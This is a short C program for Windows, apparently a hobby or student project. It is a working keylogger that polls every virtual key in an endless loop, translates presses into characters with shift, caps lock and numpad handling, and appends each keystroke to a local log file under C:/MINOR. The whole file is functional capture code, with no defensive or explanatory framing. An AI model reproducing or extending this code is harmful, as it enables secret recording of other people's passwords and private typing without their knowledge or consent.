#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#define PATH "C:/MINOR/logfile.txt" // The path to the log file

int main()
{
    FILE *log;
    int stroke_vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";

    /*//to get time
    time_t t;
    t = time(NULL);*/
    
    //making last key state 0
    for(stroke_vkey=0;stroke_vkey<0xFF;stroke_vkey++)
    {
		last_key_state[stroke_vkey]=0;
	}

    //to run infinite 
    while(1)
    {   
        Sleep(10); // take rest for 10 millisecond
        
        /* get key state of CAPSLOCK,NUMLOCK and LEFT_SHIFT/RIGHT_SHIFT
        refer here: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes */
         
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;
		
		// cheking state of all virtual keys
		for(stroke_vkey=0;stroke_vkey<0xFF;stroke_vkey++)
        {
			isPressed=(GetKeyState(stroke_vkey)&0xFF00)>0?1:0;
			showKey=(char)stroke_vkey;

			if(isPressed==1 && last_key_state[stroke_vkey]==0){
				
				//for alphabets
				if(stroke_vkey>=0x41 && stroke_vkey<=0x5A){
					if(isCAPSLOCK==0){
						if(isL_SHIFT==0 && isR_SHIFT==0){
							showKey=(char)(stroke_vkey+0x20);
						}
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=(char)(stroke_vkey+0x20);
					}
				}
				
				//for num chars
				else if(stroke_vkey>=0x30 && stroke_vkey<=0x39){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=NUMCHAR[stroke_vkey-0x30];
					}
				}
				
				//for right side numpad
				else if(stroke_vkey>=0x60 && stroke_vkey<=0x69 && isNUMLOCK==1){
					showKey=(char)(stroke_vkey-0x30);
				}
				
				//for printable chars
				else if(stroke_vkey>=0xBA && stroke_vkey<=0xC0){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vs[stroke_vkey-0xBA];
					}
					else{
						showKey=chars_vn[stroke_vkey-0xBA];
					}
				}
				else if(stroke_vkey>=0xDB && stroke_vkey<=0xDF){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vb[stroke_vkey-0xDB];
					}
					else{
						showKey=chars_va[stroke_vkey-0xDB];
					}					
				}
				
				/*for right side chars ./*-+..
				  for chars like space,\n,enter etc..
				  for enter use newline char */
				else if(stroke_vkey==0x0D){
					showKey=(char)0x0A;
				}
				else if(stroke_vkey>=0x6A && stroke_vkey<=0x6F){
					showKey=(char)(stroke_vkey-0x40);
				}
				else if(stroke_vkey!=0x20 && stroke_vkey!=0x09){
					showKey=(char)0x00;
				}
				
				//print_and_save captured key
				if(showKey!=(char)0x00){
					printf("%c",showKey);
					log=fopen(PATH,"a+");
                    //fprintf(log, "\nStarted logging @ %s", ctime(&time)); //to save log time
					putc(showKey,log);
					fclose(log);
				}				
				
			}
			//save last state of key
			last_key_state[stroke_vkey]=isPressed;
		}		
		
		
	}
}
